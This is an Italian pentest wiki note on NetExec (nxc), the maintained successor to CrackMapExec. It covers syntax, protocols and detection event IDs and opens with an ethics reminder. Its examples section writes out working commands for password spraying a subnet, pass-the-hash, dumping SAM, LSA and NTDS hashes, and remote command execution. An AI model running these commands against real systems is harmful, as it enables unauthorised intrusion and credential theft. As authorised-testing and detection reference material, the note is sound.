---
tipo: entita
tag: [tool, windows, ad]
fase: 2
fonti: 2
aggiornato: 2026-06-21
stato: maturo
aliases: ["NetExec", "nxc"]
---

# NetExec

> **Nota etica**: solo lab autorizzati o engagement con permesso scritto.

## In breve
**NetExec** (`nxc`) è il **successore mantenuto di [[CrackMapExec]]** (CME è archiviato). Swiss-army knife per il pentest di rete Windows/[[Active Directory]]: **spray** di credenziali, enumerazione [[SMB]]/WinRM/LDAP/MSSQL/RDP/SSH/FTP, esecuzione comandi, dump di hash e secrets su **molti host insieme**. Stessa filosofia e quasi stessa sintassi di CME — quando trovi `crackmapexec` in un writeup, oggi usi `nxc`.

## Sintassi base
```
nxc <protocollo> <target> -u <user> -p <pass | hash> [opzioni]
```
Target = IP singolo, CIDR (`10.10.10.0/24`) o file.

## Esempi pratici
```bash
# Valida credenziali su tutta la subnet (password spray)
nxc smb 10.10.10.0/24 -u utenti.txt -p 'Estate2025!' --continue-on-success

# Pass-the-Hash (vedi [[Pass-the-Hash]])
nxc smb 10.10.10.20 -u Administrator -H aad3b4...:31d6cfe0...

# Enumera share, utenti, password policy, sessioni
nxc smb 10.10.10.1 -u user -p pass --shares --users --pass-pol --sessions

# Dump SAM / LSA / NTDS (con privilegi adeguati)
nxc smb 10.10.10.20 -u Administrator -p pass --sam --lsa
nxc smb 10.10.10.1  -u Administrator -p pass --ntds      # DCSync-like

# Esecuzione comandi
nxc smb 10.10.10.20 -u Administrator -p pass -x 'whoami'

# Moduli (es. enumerazione vulnerabilità, spider_plus)
nxc smb 10.10.10.1 -u user -p pass -M spider_plus
```
Marcatore `(Pwn3d!)` nell'output = hai accesso amministrativo su quell'host.

## Note operative
- `--local-auth` per account locali (non di dominio).
- Database integrato (`nxc smb --help`) salva host/credenziali raccolte nell'engagement.
- Protocolli oltre SMB: `ldap`, `winrm`, `mssql`, `rdp`, `ssh`, `ftp`, `wmi`.

## Detection
- Logon **4625/4624** massivi (spray) da un singolo host; accessi `ADMIN$`/`C$` su molti target; servizi temporanei (Event **7045**) per l'esecuzione comandi.
- MITRE: **T1110** (Brute Force / Password Spraying), **T1021** (Remote Services).

## Collegamenti
- [[CrackMapExec]] — predecessore (stessa sintassi)
- [[Pass-the-Hash]] · [[Impacket]] · [[BloodHound]] · [[SMB]]
- [[Active Directory]] · [[enum4linux]]

## Fonti
- NetExec — documentazione: https://www.netexec.wiki/
- NetExec — GitHub: https://github.com/Pennyw0rth/NetExec
